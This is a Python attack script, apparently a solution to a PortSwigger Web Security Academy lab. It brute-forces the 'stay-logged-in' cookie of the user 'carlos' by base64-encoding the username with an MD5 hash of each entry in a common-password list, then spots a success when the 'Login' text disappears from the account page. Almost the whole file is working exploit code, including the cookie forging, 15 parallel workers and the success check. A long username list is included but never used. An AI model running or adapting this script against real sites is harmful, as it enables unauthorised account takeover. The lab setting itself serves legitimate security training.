#!/usr/bin/python3

import requests
import string
import datetime
import time
from multiprocessing import Pool

import random
import socket
import struct
import hashlib
import base64

password_list = [
"123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
"dragon",
"123123",
"baseball",
"abc123",
"football",
"monkey",
"letmein",
"shadow",
"master",
"666666",
"qwertyuiop",
"123321",
"mustang",
"1234567890",
"michael",
"654321",
"superman",
"1qaz2wsx",
"7777777",
"121212",
"000000",
"qazwsx",
"123qwe",
"killer",
"trustno1",
"jordan",
"jennifer",
"zxcvbnm",
"asdfgh",
"hunter",
"buster",
"soccer",
"harley",
"batman",
"andrew",
"tigger",
"sunshine",
"iloveyou",
"2000",
"charlie",
"robert",
"thomas",
"hockey",
"ranger",
"daniel",
"starwars",
"klaster",
"112233",
"george",
"computer",
"michelle",
"jessica",
"pepper",
"1111",
"zxcvbn",
"555555",
"11111111",
"131313",
"freedom",
"777777",
"pass",
"maggie",
"159753",
"aaaaaa",
"ginger",
"princess",
"joshua",
"cheese",
"amanda",
"summer",
"love",
"ashley",
"nicole",
"chelsea",
"biteme",
"matthew",
"access",
"yankees",
"987654321",
"dallas",
"austin",
"thunder",
"taylor",
"matrix",
"mobilemail",
"mom",
"monitor",
"monitoring",
"montana",
"moon",
"moscow"
]

username_list = [
"carlos",
"root",
"admin",
"test",
"guest",
"info",
"adm",
"mysql",
"user",
"administrator",
"oracle",
"ftp",
"pi",
"puppet",
"ansible",
"ec2-user",
"vagrant",
"azureuser",
"academico",
"acceso",
"access",
"accounting",
"accounts",
"acid",
"activestat",
"ad",
"adam",
"adkit",
"admin",
"administracion",
"administrador",
"administrator",
"administrators",
"admins",
"ads",
"adserver",
"adsl",
"ae",
"af",
"affiliate",
"affiliates",
"afiliados",
"ag",
"agenda",
"agent",
"ai",
"aix",
"ajax",
"ak",
"akamai",
"al",
"alabama",
"alaska",
"albuquerque",
"alerts",
"alpha",
"alterwind",
"am",
"amarillo",
"americas",
"an",
"anaheim",
"analyzer",
"announce",
"announcements",
"antivirus",
"ao",
"ap",
"apache",
"apollo",
"app",
"app01",
"app1",
"apple",
"application",
"applications",
"apps",
"appserver",
"aq",
"ar",
"archie",
"arcsight",
"argentina",
"arizona",
"arkansas",
"arlington",
"as",
"as400",
"asia",
"asterix",
"at",
"athena",
"atlanta",
"atlas",
"att",
"au",
"auction",
"austin",
"auth",
"auto",
"autodiscover"
]

session = 'CZ5sheoRHf6Hs7NtK0pbXVjfqYBsAZzg'
endpoint = "https://0a3d001c049dcc5cc0bb1749008600ba.web-security-academy.net/my-account?id=carlos"
check_string = 'Login'

def bruteforce(_password):
    md5hash = hashlib.md5(_password.encode("utf")).hexdigest()
    stay_logged_in_cookie = "carlos:" + md5hash
    message_bytes = stay_logged_in_cookie.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    cookies = {"stay-logged-in": base64_message}
    r = requests.post(endpoint,cookies=cookies)
    if check_string not in r.text:
        print("Cracked username and password: carlos" + ":" + _password)

if __name__ == '__main__':
    with Pool(15) as mp_pool:
        mp_pool.map(bruteforce, password_list)
        
        
# https://stackabuse.com/encoding-and-decoding-base64-strings-in-python/
# https://stackoverflow.com/questions/13259691/convert-string-to-md5
# https://www.md5online.org/md5-encrypt.html
# https://crackstation.net/